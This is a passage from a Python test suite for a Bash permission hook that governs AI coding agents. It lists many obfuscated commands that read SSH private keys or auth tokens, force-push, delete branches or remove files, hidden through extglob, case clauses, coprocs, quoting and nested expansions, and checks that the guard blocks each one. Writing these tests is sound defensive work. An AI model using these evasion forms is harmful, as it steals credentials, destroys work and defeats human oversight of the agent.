                            "shopt -s $'\\x6eocaseglob'; cat ~/.SS?/id_rsa",
                            "shopt -s extglob; cat ~/@(.ssh|other)/id_rsa",
                            "shopt -s extglob; cat ~/.s@(sh|foo bar)/id_rsa",
                            "shopt -s extglob; cat ~/.c@(odex|foo; bar)/auth.json",
                            'cd "$X"; shopt -s nocaseglob; cat .SS?/id_rsa',
                            'cd "$X"; shopt -s extglob; cat @(.ssh|other)/id_rsa',
                            "shopt -s extglob; cat ~/+(x|.ssh)/../.ssh/id_rsa"):
                with self.subTest(role=role, command=command):
                    current, _ = self.approved(policy, command)
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
            for inherited, command in (("nocaseglob", "cat ~/.SS?/id_rsa"),
                                        ("extglob", "cat ~/@(.ssh|other)/id_rsa")):
                with self.subTest(inherited=inherited), patch.dict(os.environ, {"BASHOPTS": inherited}):
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, policy, None))
            with patch.dict(os.environ, {"BASHOPTS": "", "GLOBIGNORE": ""}):
                self.assertIsNone(sp.protected_reason("Bash", {"command": "cat ~/.SS?/id_rsa"}, policy, None))
            for command in ("shopt -s nocaseglob; cat /outside/api/*.JSON",
                            "shopt -s extglob; cat /outside/api/@(schema|types).json"):
                with self.subTest(command=command):
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                    current, _ = self.approved(policy, command)
                    self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev011_rev012_bash_fixture_paths_reach_the_guard(self):
        # Only disposable names are expanded; no real credential is read.
        with tempfile.TemporaryDirectory() as root:
            home = Path(root, "home")
            store = home / ".ssh"
            store.mkdir(parents=True)
            (store / "id_rsa").touch()
            cases = (("shopt -s dot\\\nglob; ", "~/*/id_rsa"),
                     ('shopt -s "dot""glob"; ', "~/*/id_rsa"),
                     ("shopt -s $'\\x64otglob'; ", "~/*/id_rsa"),
                     ("CD\\\nPATH=~ cd .ssh; ", '"$PWD/id_rsa"'),
                     ('export "CD""PATH=~"; cd .ssh; ', '"$PWD/id_rsa"'),
                     ('HO\\\nME="$X" cd; ', '"$PWD/id_rsa"'),
                     ('cd /tmp; export "OLD""PWD=$X"; cd -; ', '"$PWD/id_rsa"'),
                     ('shopt -s "nocase""glob"; ', "~/.SS?/id_rsa"),
                     ("shopt -s extglob; ", "~/@(.ssh|other)/id_rsa"),
                     ("shopt -s extglob; ", "~/.s@(sh|foo bar)/id_rsa"))
            environment = {**os.environ, "HOME": str(home), "X": str(store), "CDPATH": "", "GLOBIGNORE": ""}
            with patch.dict(os.environ, environment), patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                for prefix, operand in cases:
                    with self.subTest(prefix=prefix):
                        baseline = subprocess.run(["bash", "--noprofile", "--norc", "-O", "extglob", "-c",
                            prefix + "printf '%s\\n' " + operand], cwd=root, env=environment,
                            capture_output=True, text=True)
                        self.assertEqual(0, baseline.returncode, baseline.stderr)
                        self.assertEqual(str(store / "id_rsa"), baseline.stdout.splitlines()[-1])
                        command = prefix + "cat " + operand
                        for role in ("resolve", "rereview"):
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command},
                                sp.StagePolicy(role), root))

    @posix_shell
    def test_rev012_extglob_directory_targets_remain_unresolved(self):
        with tempfile.TemporaryDirectory() as root:
            work = Path(root, "work")
            store = Path(root, "secret/.ssh")
            work.mkdir()
            store.mkdir(parents=True)
            (work / "link").symlink_to(store, target_is_directory=True)
            target = str(work / "@(link)")
            baseline = subprocess.run(["bash", "--noprofile", "--norc", "-O", "extglob", "-c",
                                       "cd " + target + "; pwd -P"], cwd=root, capture_output=True, text=True)
            self.assertEqual((0, str(store)), (baseline.returncode, baseline.stdout.strip()))
            with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                for role in ("resolve", "rereview"):
                    policy = sp.StagePolicy(role)
                    for program in ("cd", "pushd", "env -C"):
                        suffix = " cat id_rsa" if program == "env -C" else "; cat id_rsa"
                        command = program + " " + target + suffix
                        with self.subTest(role=role, program=program):
                            current, _ = self.approved(policy, command)
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, root))
                            self.assertFalse(sp.check(command, current, cwd=root).allowed)
                    safe = "cd " + target + "; cat schema.json"
                    self.assertTrue(sp.unresolved_directory(safe, policy, root))
                    self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, root))
                    current, _ = self.approved(policy, safe)
                    self.assertTrue(sp.check(safe, current, cwd=root).allowed)

    @posix_shell
    def test_rev013_nested_expansions_do_not_hide_later_segments(self):
        for operator in ("@", "!", "*", "+", "?"):
            for expansion in ("${x:-(}", "${x/(/y}", "$[(1)]", "${x:-${y:-(}}"):
                for comment in ("", " # )"):
                    command = "shopt -s extglob\nls " + operator + "(" + expansion + "); cat ~/.ssh/id_rsa /dev/null" + comment
                    for role in ("resolve", "rereview"):
                        with self.subTest(operator=operator, expansion=expansion, comment=comment, role=role):
                            policy = sp.StagePolicy(role)
                            parsed = sp.parse_command(command, None)
                            self.assertEqual("cat", parsed.segments[-1].words[0])
                            current, _ = self.approved(policy, command)
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                            self.assertFalse(sp.check(command, current).allowed)

    @posix_shell
    def test_rev013_expansion_substitutions_stay_guarded_and_safe_forms_get_consent(self):
        for role in ("resolve", "rereview"):
            policy = sp.StagePolicy(role)
            grant = grants.make_pattern_grant(r".+", role, "claude", "linux", compound=True,
                proposer="test", justification="exercise retained guards",
                positive=["printf hello | cat"], negative=["\n"])
            current = replace(policy, command_permissions=({"operation": grant.operation, "decision": "allow"},))
            for expansion in ("${x:-(}", "${x/(/y}", "$[(1)]", "${x:-$(cat ~/.ssh/id_rsa)}",
                              "${x:-$[1 + $(cat ~/.ssh/id_rsa)]}"):
                command = "shopt -s extglob\nls @(" + expansion + "); cat ~/.ssh/id_rsa # )"
                with self.subTest(role=role, expansion=expansion):
                    self.assertIsNone(sp.matching_answer("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
                    self.assertIsNone(cp.refused_operation([command], current,
                        grants.ConsentBroker("owner/repo", platform="linux"), "claude"))
            for expansion in ("${x:-$(git push --force origin main)}", "$[1 + $(git push --force origin main)]"):
                command = "ls @(" + expansion + ")"
                with self.subTest(role=role, expansion=expansion):
                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                    self.assertFalse(sp.check(command, current).allowed)
            for expansion in ('${x:-$(printf ")"; git push --force origin main)}',
                              '$[1 + $(printf ")"; git push --force origin main)]',
                              '${x:-${y:-$(printf ")"; git push --force origin main)}}',
                              '${x:-`printf ")"; git push --force origin main`}',
                              "${x:-$'\\\'})(\'$(printf \" )\"; git push --force origin main)}",
                              "${x:-${y:-a}$\\\n'\\\'})(\'$(printf \" )\"; git push --force origin main)}",
                              '${x:-$(printf x # )\ngit push --force origin main\n)}',
                              '${x:-$(cat <<EOF\n)\nEOF\ngit push --force origin main\n)}'):
                command = "shopt -s extglob\nprintf '%s' @(" + expansion + ")"
                with self.subTest(role=role, expansion=expansion), tempfile.TemporaryDirectory() as root:
                    # Keep the cwd away from stores so the outer brace operand
                    # cannot mask a lost substitution's Git guard.
                    self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, current, root)).lower())
                    self.assertFalse(sp.check(command, current, cwd=root).allowed)
            # Slash-bearing brace operands retain the existing conservative
            # credential guard (PA-28); they are not benign-consent examples.
            for expansion in ("${x:-(}", "$[(1)]", "${x:-${y:-(}}",
                              "${x:-\"}\"}", "${x:-\\}}", "${x:-$'('}"):
                command = "ls /outside/api/@(" + expansion + "); printf done"
                with self.subTest(role=role, expansion=expansion):
                    self.assertEqual("printf", sp.parse_command(command, None).segments[-1].words[0])
                    self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                    self.assertIsNotNone(cp.refused_operation([command], policy,
                        grants.ConsentBroker("owner/repo", platform="linux"), "claude"))
                    self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_rev013_escaped_space_does_not_start_a_shell_comment(self):
        commands = ('(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue )',
                    '(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue ) # )',
                    '(printf "%s\\n" "$(printf a\\ #)"; git push --force origin main\ntrue ) # "',
                    'printf "%s" $(printf ""#); git push --force origin main',
                    'printf "%s" $(printf \\ #); git push --force origin main')
        for role in ("resolve", "rereview"):
            for command in commands:
                with self.subTest(role=role, command=command), tempfile.TemporaryDirectory() as root:
                    policy, _ = self.approved(sp.StagePolicy(role), command)
                    self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, policy, root)).lower())
                    self.assertFalse(sp.check(command, policy, cwd=root).allowed)

    @posix_shell
    def test_rev013_unterminated_extglobs_and_expansions_fail_closed(self):
        for command in ("ls @(foo", "ls @(${x:-(}", "ls @(${x:-foo)", "ls @($[(1))",
                        "ls @(${x:-$(printf x)}", "ls @(${x:-`printf x})"):
            with self.subTest(command=command), self.assertRaisesRegex(sp.PolicyError, "unterminated"):
                sp.parse_command(command, None)
        command = "ls @(" + "${x:-" * 40 + "x" + "}" * 40 + ")"
        with self.assertRaisesRegex(sp.PolicyError, "resource limit"):
            sp.parse_command(command, None)

    @posix_shell
    def test_rev013_bash_fixture_executes_the_later_segment(self):
        # Prove Bash's boundary using a disposable file, never a real store.
        with tempfile.TemporaryDirectory() as root:
            store = Path(root, "fixture-store")
            store.mkdir()
            target = store / "fixture.txt"
            target.write_text("later segment ran\n", encoding="utf-8")
            for operator in ("@", "!", "*", "+", "?"):
                # Older Bash versions count parentheses in the parameter
                # forms differently. Arithmetic expansion reproduces the
                # hidden segment on those versions too; all reported forms
                # retain conservative parser coverage in the test above.
                for expansion in ("$[(1)]",):
                    for comment in ("", " # )"):
                        command = "shopt -s extglob\nls " + operator + "(" + expansion + "); cat " + str(target) + comment
                        with self.subTest(operator=operator, expansion=expansion, comment=comment):
                            baseline = subprocess.run(["bash", "--noprofile", "--norc", "-c", command], cwd=root,
                                env={**os.environ, "x": "", "BASH_ENV": "/dev/null"}, capture_output=True, text=True)
                            self.assertEqual(0, baseline.returncode, baseline.stderr)
                            self.assertTrue(baseline.stdout.endswith("later segment ran\n"), baseline.stdout)
                            with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                                for role in ("resolve", "rereview"):
                                    self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, sp.StagePolicy(role), root))

    REV014_EXTGLOB_FORMS = (
        'printf \'%s\' "$(printf \'%s\' @(for ((0))); for ((;;)) do case a in a) {cmd} ;; esac; break; done)"',
        'printf \'%s\' "$(printf \'%s\' @(for ((0))); for ((;;)) { case a in a) {cmd} ;; esac; break; })"')

    REV014_LOOP_FORMS = (
        'printf \'%s\' "$(for ((;;)) do case a in a) {cmd} ;; esac; break; done)"',
        'printf \'%s\' "$(for ((;;)) { case a in a) {cmd} ;; esac; break; })"',
        'printf \'%s\' "$(set -- 1; for x do case a in a) {cmd} ;; esac; done)"',
        'printf \'%s\' "$(set -- 1; select x do case a in a) {cmd} ;; esac; break; done)"',
        'echo $(for((;;))do case a in a) {cmd} ;; esac; break; done)',
        'printf "%s" "$(for (((0);1;)) do case a in a) {cmd} ;; esac; break; done)"',
        'printf "%s" "$(for ((;1;)) { case a in a) {cmd} ;; esac; break; })"',
        'echo $(set -- 1; for x \\\ndo case a in a) {cmd} ;; esac; done)',
        'echo $(for ((;;)) d\\\no ca\\\nse a in a) {cmd} ;; esac; break; done)',
        'cat <(for ((;;)) do case a in a) {cmd} ;; esac; break; done)',
        'echo $(for ((;;)) do if case a in a) {cmd} ;; esac; then break; fi; done)',
        'echo $(case a in a) for ((;;)) do case b in b) {cmd} ;; esac; break; done ;; esac)',
        'printf "%s" "$(for (( $(printf 0 \'for ((0))\') ;1; )) do case a in a) {cmd} ;; esac; break; done)"',
        'printf "%s" "$(set -- 1; for x do {cmd}; done)"',
        'printf "%s" "$(set -- 1; select x do {cmd}; break; done)"',
        *REV014_EXTGLOB_FORMS)

    #: `case` clauses inside substitutions whose later command Bash runs
    #: (REV-014). `{cmd}` is replaced by the hidden command.
    REV014_FORMS = ('printf \'%s\' "$(case a in a) {cmd} ;; esac)"',
                    "echo $(case a in a) {cmd} ;; esac)",
                    "echo $(case a in b) true ;& a) {cmd} ;; esac)",
                    "echo $(case a in a) true ;;& a) {cmd} ;; esac)",
                    "echo $(case a in (a) {cmd} ;; esac)",
                    "echo $(case a in (b) true ;; a | c) {cmd} ;; esac)",
                    "echo $(case a in a) {cmd}\nesac)",
                    "echo $(case a in\n  # comment )\n  a) {cmd} ;;\nesac)",
                    "echo $(true; case a in a) case b in b) {cmd} ;; esac ;; esac)",
                    "echo $( (case a in a) true ;; esac) ; {cmd})",
                    "echo $(if true; then case a in a) {cmd} ;; esac; fi)",
                    "echo $(case \"$(printf a)\" in a) {cmd} ;; esac)",
                    'echo "$(case a in a) true ;; esac)"; {cmd}',
                    "cat <(case a in a) {cmd} ;; esac)",
                    "echo ${x:-$(case a in a) {cmd} ;; esac)}",
                    'printf \'%s\' "$(f() case a in a) {cmd} ;; esac; f)"',
                    "echo $(function f case a in a) {cmd} ;; esac; f)",
                    "echo $(function f() case a in a) {cmd} ;; esac; f)",
                    'printf "%s" "$(f-x() case a in a) {cmd} ;; esac; f-x)"',
                    'printf "%s" "$(function f-x case a in a) {cmd} ;; esac; f-x)"',
                    'printf "%s" "$(function f/x() case a in a) {cmd} ;; esac; f/x)"',
                    'printf "%s" "$(Ω() case a in a) {cmd} ;; esac; Ω)"',
                    'printf "%s" "$(+() case a in a) {cmd} ;; esac; +)"',
                    'printf "%s" "$(function @ case a in a) {cmd} ;; esac; @)"',
                    'printf "%s" "$(printf pre' + "\\" * 2 + '\ncase a in a) {cmd} ;; esac)"',
                    'printf "%s" "$(printf pre' + "\\" * 4 + '\ncase a in a) {cmd} ;; esac)"',
                    'printf "%s" "$(case a in a) if case b in b) {cmd} ;; esac; then true; fi ;; esac)"',
                    'printf "%s" "$(case a in a) time case b in b) {cmd} ;; esac ;; esac)"',
                    'printf "%s" "$(case a in a) while case b in b) {cmd} ;; esac; do break; done ;; esac)"',
                    'printf "%s" "$(case a in a) \\\ncase b in b) {cmd} ;; esac ;; esac)"',
                    "echo $(coproc case a in a) {cmd} ;; esac; cat <&${COPROC[0]}; wait)",
                    "echo $(coproc worker case a in a) {cmd} ;; esac; cat <&${worker[0]}; wait)",
                    "echo $(ca\\\nse a in a) {cmd} ;; esac)",
                    "echo $(case a i\\\nn a) {cmd} ;; esac)",
                    "echo $(case a in a) {cmd} ;; es\\\nac)",
                    "cat <(f() case a in a) {cmd} ;; esac; f)",
                    "echo $(f\\\n() ca\\\nse a i\\\nn a) {cmd} ;; es\\\nac; f)",
                    *REV014_LOOP_FORMS)

    # Some Bash versions reject these TIMEOPT/TIMEIGN forms. Retain their
    # conservative parser coverage without claiming a successful Bash baseline.
    REV014_TIME_FORMS = ("echo $(time -p case a in a) {cmd} ;; esac)",
                        "echo $(time -- case a in a) {cmd} ;; esac)",
                        "echo $(time -p -- case a in a) {cmd} ;; esac)")

    def rev014_grant(self, role, executor):
        grant = grants.make_pattern_grant(r".+", role, executor, "linux", compound=True,
            proposer="test", justification="exercise retained guards",
            positive=["printf hello | cat"], negative=["\n"])
        return replace(sp.StagePolicy(role), command_permissions=({"operation": grant.operation, "decision": "allow"},))

    @posix_shell
    def test_rev014_case_patterns_do_not_end_substitutions(self):
        for executor in ("claude", "codex"):
            for role in ("resolve", "rereview"):
                current = self.rev014_grant(role, executor)
                for form in (*self.REV014_FORMS, *self.REV014_TIME_FORMS):
                    command = form.replace("{cmd}", "git push --force origin main")
                    with self.subTest(executor=executor, role=role, command=command), \
                            tempfile.TemporaryDirectory() as root:
                        parsed = sp.parse_command(command, None)
                        self.assertIn(["git", "push", "--force", "origin", "main"],
                                      [segment.words for segment in parsed.segments])
                        self.assertIn("git", str(sp.protected_reason("Bash", {"command": command}, current, root)).lower())
                        self.assertFalse(sp.check(command, current, cwd=root).allowed)
                        self.assertIsNone(cp.refused_operation([command], current,
                            grants.ConsentBroker("owner/repo", platform="linux"), executor))
                    command = form.replace("{cmd}", "cat ~/.ssh/id_rsa")
                    with self.subTest(executor=executor, role=role, command=command):
                        self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                        self.assertFalse(sp.check(command, current).allowed)

    @posix_shell
    def test_rev014_case_words_as_arguments_keep_their_boundaries(self):
        policy = sp.StagePolicy("resolve")
        for body in ("echo case a in a", "echo then case a in a", "echo \\; case a in a",
                     "echo $(true) case a in a", "echo function f case a in a",
                     "echo coproc worker case a in a", "echo time -p case a in a",
                     "echo for x do case a in a", "echo select x do case a in a",
                     "echo for x do if case a in a", 'echo "for ((;;))" do case a in a',
                     "printf '%s' 'for ((;;))' do case a in a",
                     'for ((;;)) do break; done; printf "%s" @((a)) do case a in a',
                     "echo @() case a in a", "echo +() case a in a", "echo *() case a in a",
                     "echo ?() case a in a", "echo !() case a in a",
                     "echo ca\\\nse a in a", "printf '%s' esac", "case a in a) printf ok ;; esac"):
            command = 'printf "%s" "$(' + body + ')"; printf done'
            with self.subTest(command=command):
                self.assertEqual(["printf", "done"], sp.parse_command(command, None).segments[-1].words)
                self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
        for command in ("echo $(case a in a", "echo $(case a in a) true ;; esac"):
            with self.subTest(command=command), self.assertRaisesRegex(sp.PolicyError, "unterminated"):
                sp.parse_command(command, None)

    @posix_shell
    def test_rev014_safe_cases_get_consent_and_real_hook_retains_guards(self):
        with tempfile.TemporaryDirectory() as root:
            for role in ("resolve", "rereview"):
                for form in self.REV014_FORMS:
                    command = form.replace("{cmd}", "printf safe")
                    with self.subTest(role=role, command=command):
                        policy = sp.StagePolicy(role, tmpdir=root)
                        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, root))
                        self.assertIsNotNone(cp.refused_operation([command], policy,
                            grants.ConsentBroker("owner/repo", platform="linux"), "claude", root))
                        approved, _ = self.approved(policy, command, cwd=root)
                        self.assertTrue(sp.check(command, approved, cwd=root).allowed)
                path = Path(root, "policy.json")
                for form in (self.REV014_FORMS[15], *self.REV014_LOOP_FORMS):
                    for body, allowed in (("printf safe", True), ("git push --force origin main", False),
                                          ("cat ~/.ssh/id_rsa", False)):
                        command = form.replace("{cmd}", body)
                        with self.subTest(role=role, command=command):
                            policy = self.rev014_grant(role, "claude")
                            if allowed:
                                # `.+` does not match newlines. Use exact
                                # consent for the continuation-form positives.
                                policy, _ = self.approved(sp.StagePolicy(role), command, cwd=root)
                            path.write_text(policy.to_json(), encoding="utf-8")
                            completed = subprocess.run([sys.executable, str(Path(sp.__file__)), "hook", str(path)],
                                input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": root}),
                                capture_output=True, text=True)
                            self.assertEqual(0, completed.returncode, completed.stderr)
                            self.assertEqual(allowed, completed.stdout == "", completed.stdout)
                            if not allowed:
                                self.assertIn("[layer=toolkit_hook]", completed.stdout)

    @posix_shell
    def test_rev014_bash_fixture_runs_the_command_after_the_pattern(self):
        # Prove Bash's boundary using a disposable file, never a real store.
        with tempfile.TemporaryDirectory() as root:
            store = Path(root, "fixture-store")
            store.mkdir()
            target = store / "fixture.txt"
            target.write_text("hidden command ran\n", encoding="utf-8")
            for form in self.REV014_FORMS:
                command = form.replace("{cmd}", "cat " + str(target))
                with self.subTest(command=command):
                    options = ["-O", "extglob"] if form in self.REV014_EXTGLOB_FORMS else []
                    baseline = subprocess.run(["bash", "--noprofile", "--norc", *options, "-c", command], cwd=root,
                        env={**os.environ, "BASH_ENV": "/dev/null"}, input="1\n", capture_output=True, text=True)
                    self.assertEqual(0, baseline.returncode, baseline.stderr)
                    self.assertIn("hidden command ran", baseline.stdout)
                    with patch.object(sp, "CREDENTIAL_STORES", (str(store),)):
                        for role in ("resolve", "rereview"):
                            self.assertIsNotNone(sp.protected_reason("Bash", {"command": command},
                                                                     sp.StagePolicy(role), root))

    REV015_FORMS = (
        'function f { {cmd}; }; f',
        'function f-x { {cmd}; }; f-x',
        'function f/x { {cmd}; }; f/x',
        'function f { {cmd}; }; printf "%s" "$(f)"',
        'printf "%s" "$(function f { {cmd}; }; f)"',
        'coproc {cmd}',
        'coproc {cmd}; wait',
        'coproc { {cmd}; }; wait',
        'coproc worker { {cmd}; }; wait',
        'coproc worker ( {cmd} ); wait',
        'coproc git { {cmd}; }; wait',
        'function f() { {cmd}; }; f',
        'time ! {cmd}',
        'printf "%s" "$(coproc worker { {cmd}; }; wait)"',
        'time coproc {cmd}',
        '! coproc {cmd}',
        'function f if {cmd}; then true; fi; f',
        'set -- 1; for x\n{ {cmd}; }',
        'set -- 1; select x\n{ {cmd}; break; }',
        # Negation followed by a subshell behind the same headers is not an
        # extglob operand: the `!(` check peels the same headers.
        'function f { !({cmd}); }; f',
        'coproc { !({cmd}); }; wait',
        'set -- 1; select x\n{ !({cmd}); break; }',
        'function f if !({cmd}); then :; fi; f',
    )

    @posix_shell
    def test_rev015_body_programs_keep_their_guards(self):
        bodies = ('git push --force origin main', 'git branch -D task',
                  'gh pr merge 468 --repo owner/repo', 'find . -exec echo unsafe \\;',
                  'cat ~/.ssh/id_rsa')
        # Include the review's single-line loop spellings conservatively,
        # without claiming this Bash accepts them (the baseline below does not).
        forms = (*self.REV015_FORMS, 'set -- 1; for x { {cmd}; }',
                 'set -- 1; select x { {cmd}; break; }')
        with tempfile.TemporaryDirectory() as root:
            for executor in ('claude', 'codex'):
                for role in ('resolve', 'rereview'):
                    policy = self.rev014_grant(role, executor)
                    for form in forms:
                        for body in bodies:
                            command = form.replace('{cmd}', body)
                            with self.subTest(executor=executor, role=role, command=command):
                                segments = sp.parse_command(command, None).segments
                                self.assertTrue(any(segment.words[:1] == [body.split()[0]]
                                                    for segment in segments), segments)
                                self.assertIsNotNone(sp.protected_reason('Bash', {'command': command}, policy, root))
                                self.assertFalse(sp.check(command, policy, cwd=root).allowed)
                                self.assertIsNone(cp.refused_operation([command], policy,
                                    grants.ConsentBroker('owner/repo', platform='linux'), executor, root))

    @posix_shell
    def test_rev015_bash_baseline_and_real_hook_allow_and_deny(self):
        with tempfile.TemporaryDirectory() as root:
            marker = Path(root, 'marker')
            # Every protected-looking program is a Bash function writing only
            # to this fixture. No push, ref deletion, gh write or find runs.
            stub = ('record() { printf executed > ' + str(marker) + '; }; '
                    'git() { record; }; gh() { record; }; find() { record; }; ')
            path = Path(root, 'policy.json')
            for form in self.REV015_FORMS:
                for body, allowed in (('printf safe', True), ('git push --force origin main', False),
                                      ('git branch -D task', False),
                                      ('gh pr merge 468 --repo owner/repo', False),
                                      ('find . -exec echo unsafe \\;', False)):
                    command = form.replace('{cmd}', body)
                    with self.subTest(command=command):
                        marker.unlink(missing_ok=True)
                        baseline = subprocess.run(['bash', '--noprofile', '--norc', '-c',
                            stub + command + '\nwait'], cwd=root, input='1\n', capture_output=True,
                            text=True, timeout=10, env={**os.environ, 'BASH_ENV': '/dev/null'})
                        self.assertEqual(0, baseline.returncode, baseline.stderr)
                        if not allowed:
                            self.assertEqual('executed', marker.read_text())
                        for role in ('resolve', 'rereview'):
                            policy = self.rev014_grant(role, 'claude')
                            if allowed:
                                # Exact grants also cover newline-bearing forms.
                                policy, _ = self.approved(sp.StagePolicy(role), command, cwd=root)
                            path.write_text(policy.to_json(), encoding='utf-8')
                            completed = subprocess.run([sys.executable, str(Path(sp.__file__)), 'hook', str(path)],
                                input=json.dumps({'tool_name': 'Bash', 'tool_input': {'command': command}, 'cwd': root}),
                                capture_output=True, text=True, timeout=10)
                            self.assertEqual(0, completed.returncode, completed.stderr)
                            self.assertEqual(allowed, completed.stdout == '', completed.stdout)
                            if not allowed:
                                self.assertIn('[layer=toolkit_hook]', completed.stdout)

    def test_rev015_coproc_name_is_not_a_program(self):
        for command in ('coproc worker ( printf ok ); wait', 'coproc worker { printf ok; }; wait',
                        'coproc worker [[ -n x ]]; wait'):
            with self.subTest(command=command):
                programs = [segment.words[:1] for segment in sp.parse_command(command, None).segments]
                self.assertNotIn(['worker'], programs)
        # Unnamed simple coproc: the first word is the program, not a name.
        self.assertEqual([['printf', 'ok']],
                         [segment.words for segment in sp.parse_command('coproc printf ok', None).segments])

    @posix_shell
    def test_rev015_header_words_in_arguments_remain_data(self):
        for command in ('printf "%s" function f { git push --force origin main; printf done',
                        'echo coproc git push --force origin main; printf done',
                        'echo for x { git push --force origin main; printf done',
                        'echo time coproc git push --force origin main; printf done'):
            with self.subTest(command=command):
                policy, _ = self.approved(sp.StagePolicy('resolve'), command)
                self.assertIsNone(sp.protected_reason('Bash', {'command': command}, policy, None))
                self.assertTrue(sp.check(command, policy).allowed)

    #: Quoted spellings of reserved words. Bash recognises a reserved word
    #: only when it is unquoted, so after `coproc NAME` each one is an
    #: argument of the simple command NAME (REV-016).
    REV016_QUOTED = ('"if"', "'if'", '\\if', 'i""f', "$'if'", '"{"', "'{'", '\\{', "'[['",
                     '"while"', '"until"', '"for"', '"select"', '"case"')
    REV016_FORMS = ('coproc {cmd}; wait', 'printf "%s" "$(coproc {cmd}; wait)"',
                    'time coproc {cmd}; wait', '! coproc {cmd}; wait')
    #: The same loss of quoting: an empty quoted word is still a word, and a
    #: `#` after a quoted prefix is not a comment.
    REV016_WORD_FORMS = ('coproc {prog} "" if {args}; wait', "coproc {prog} '' if {args}; wait",
                         '""#; {prog} {args}', "''# x; {prog} {args}", 'printf "%s" "$(""#; {prog} {args})"')

    def rev016_commands(self, prog, args):
        for form in self.REV016_FORMS:
            for quoted in self.REV016_QUOTED:
                yield form.replace('{cmd}', ' '.join((prog, quoted, args)))
        for form in self.REV016_WORD_FORMS:
            yield form.replace('{prog}', prog).replace('{args}', args)

    @posix_shell
    def test_rev016_quoted_reserved_words_keep_the_coprocess_program(self):
        bodies = ('src -delete', 'src -exec rm -rf {} +')
        with tempfile.TemporaryDirectory() as root:
            for executor in ('claude', 'codex'):
                for role in ('resolve', 'rereview'):
                    policy = self.rev014_grant(role, executor)
                    for args in bodies:
                        for command in self.rev016_commands('find', args):
                            with self.subTest(executor=executor, role=role, command=command):
                                segments = sp.parse_command(command, None).segments
                                self.assertTrue(any(segment.words[:1] == ['find'] for segment in segments), segments)
                                self.assertIn('find', str(sp.protected_reason('Bash', {'command': command},
                                                                              policy, root)))
                                self.assertFalse(sp.check(command, policy, cwd=root).allowed)
                                self.assertIsNone(cp.refused_operation([command], policy,
                                    grants.ConsentBroker('owner/repo', platform='linux'), executor, root))

    @posix_shell
    def test_rev016_bash_baseline_and_real_hook_allow_and_deny(self):
        with tempfile.TemporaryDirectory() as root:
            marker = Path(root, 'marker')
            # `find` is a Bash function writing only to this fixture.
            stub = 'find() { printf executed > ' + str(marker) + '; }; '
            path = Path(root, 'policy.json')
            for command in self.rev016_commands('find', 'src -delete'):
                with self.subTest(command=command):
                    marker.unlink(missing_ok=True)
                    baseline = subprocess.run(['bash', '--noprofile', '--norc', '-c', stub + command + '\nwait'],
                        cwd=root, capture_output=True, text=True, timeout=10,
                        env={**os.environ, 'BASH_ENV': '/dev/null'})
                    self.assertEqual(0, baseline.returncode, baseline.stderr)
                    self.assertEqual('executed', marker.read_text())
                    for role in ('resolve', 'rereview'):
                        for body, allowed in ((command, False), (command.replace('find', 'printf'), True)):
                            policy = self.rev014_grant(role, 'claude')
                            if allowed:
                                policy, _ = self.approved(sp.StagePolicy(role), body, cwd=root)
                            path.write_text(policy.to_json(), encoding='utf-8')
                            completed = subprocess.run([sys.executable, str(Path(sp.__file__)), 'hook', str(path)],
                                input=json.dumps({'tool_name': 'Bash', 'tool_input': {'command': body}, 'cwd': root}),
                                capture_output=True, text=True, timeout=10)
                            self.assertEqual(0, completed.returncode, completed.stderr)
                            self.assertEqual(allowed, completed.stdout == '', completed.stdout)
                            if not allowed:
                                self.assertIn('[layer=toolkit_hook]', completed.stdout)

    def test_rev016_unquoted_reserved_words_still_name_the_coprocess(self):
        for command in ('coproc worker if true; then printf ok; fi; wait',
                        'coproc worker { printf ok; }; wait', 'coproc worker [[ -n x ]]; wait',
                        'coproc wor\\\nker case a in a) printf ok ;; esac; wait'):
            with self.subTest(command=command):
                programs = [segment.words[:1] for segment in sp.parse_command(command, None).segments]
                self.assertNotIn(['worker'], programs)
        # A line continuation is not quoting: `i\<newline>f` is the reserved word.
        self.assertNotIn(['worker'], [segment.words[:1] for segment in
                                      sp.parse_command('coproc worker i\\\nf true; then :; fi', None).segments])
        # Empty quoted words are words; a `#` that starts a word is a comment.
        self.assertEqual([['printf', '', 'x']], [segment.words for segment in
                                                 sp.parse_command('printf "" x; # git push', None).segments])

    @posix_shell
    def test_rev016_quoted_words_keep_redirect_and_tilde_meaning(self):
        segments = lambda command: sp.parse_command(command, None).segments
        # A quoted digit is an argument; the redirection is stdout.
        for command in ('printf "2">f; true', 'printf \\2>f; true', 'printf 2"">f; true'):
            with self.subTest(command=command):
                self.assertEqual((['printf', '2'], [('1', '>', 'f')]),
                                 (segments(command)[0].words, segments(command)[0].redirects))
        # An unquoted digit is the descriptor, not an argument.
        self.assertEqual(['printf'], segments('printf 2>f; true')[0].words)
        # `""~` is a literal tilde; a bare `~` is still $HOME.
        self.assertEqual(['cat', '~/x'], segments('cat ""~/x; true')[0].words)
        self.assertEqual(['cat', str(Path.home() / 'x')], segments('cat ~/x; true')[0].words)
        # An empty redirect target is consumed, so the next program keeps its guard.
        with tempfile.TemporaryDirectory() as root:
            marker = Path(root, 'marker')
            for command in ('printf x > ""; git push --force origin main',
